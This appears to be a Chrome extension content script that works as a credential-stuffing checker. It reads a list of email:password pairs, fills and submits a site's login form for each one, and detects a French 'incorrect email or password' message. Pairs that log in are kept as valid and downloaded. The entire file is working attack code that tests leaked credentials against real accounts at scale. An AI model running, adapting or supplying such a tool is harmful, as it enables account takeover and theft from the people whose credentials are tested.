let accounts = [];
let currentIndex = 0;
let validAccounts = [];

function parseAccounts(inputText) {
  let lines = inputText.split("\n");
  return lines
    .map((line) => {
      let parts = line.split(" | ")[0].split(":");
      return { email: parts[0].trim(), password: parts[1]?.trim() || "" };
    })
    .filter((account) => account.email && account.password);
}

function checkNextAccount(selectors) {
  if (currentIndex >= accounts.length) {
    alert("Finished checking all accounts.");
    downloadValidAccounts();
    return;
  }

  let emailInput = document.querySelector(selectors.emailID);
  let passwordInput = document.querySelector(selectors.passwordID);
  let loginButton = document.querySelector(selectors.connectID);

  if (!emailInput || !passwordInput || !loginButton) {
    alert("Login fields not found!");
    return;
  }

  let { email, password } = accounts[currentIndex];

  emailInput.value = email;
  emailInput.dispatchEvent(new Event("input", { bubbles: true }));

  passwordInput.value = password;
  passwordInput.setAttribute("value", password);
  passwordInput.dispatchEvent(new Event("input", { bubbles: true }));

  setTimeout(() => {
    if (!loginButton.disabled) {
      loginButton.click();

      setTimeout(() => {
        let errorMessage = document.querySelector(
          ".flash-message__text---c7Df"
        );

        if (
          errorMessage &&
          errorMessage.innerText.includes(
            "L'e-mail ou le mot de passe est incorrect"
          )
        ) {
          console.log(`Invalid: ${email}`);
        } else {
          console.log(`Valid: ${email} | Password: ${password}`);
          validAccounts.push(`${email}:${password}`);
        }

        currentIndex++;
        checkNextAccount(selectors);
      }, 4000);
    } else {
      console.log(`Invalid: ${email} (Button disabled)`);
      currentIndex++;
      checkNextAccount(selectors);
    }
  }, 1500);
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (
    request.action === "startCheck" &&
    request.accounts &&
    request.selectors
  ) {
    accounts = parseAccounts(request.accounts);
    currentIndex = 0;
    validAccounts = [];
    checkNextAccount(request.selectors);
  }
});
